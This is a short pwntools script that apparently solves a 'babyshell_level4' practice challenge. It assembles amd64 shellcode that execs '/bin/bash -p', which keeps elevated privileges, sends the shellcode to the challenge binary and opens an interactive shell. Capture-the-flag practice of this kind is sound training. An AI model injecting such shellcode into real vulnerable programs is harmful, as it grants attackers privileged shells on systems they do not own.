from pwn import *

DEBUG = False

bin_path = '/challenge/babyshell_level4'
context.arch = 'amd64'

if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    p = gdb.debug([bin_path])
else:
    p = process([bin_path])

# Shell
shellcode = f'''
push 0x68  # b'h'
push 0x6e69622f 
mov dword ptr [rsp+4], 0x7361622f  # b'/bin/bas'
push rsp
pop rdi
push 0x702d  # b'-p'
push rsp
pop rsi
push 0
push rsi
push rdi
push rsp
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
'''
print(shellcode)

shellcode = asm(shellcode)

print(disasm(shellcode))

p.send(shellcode)
print(p.interactive())
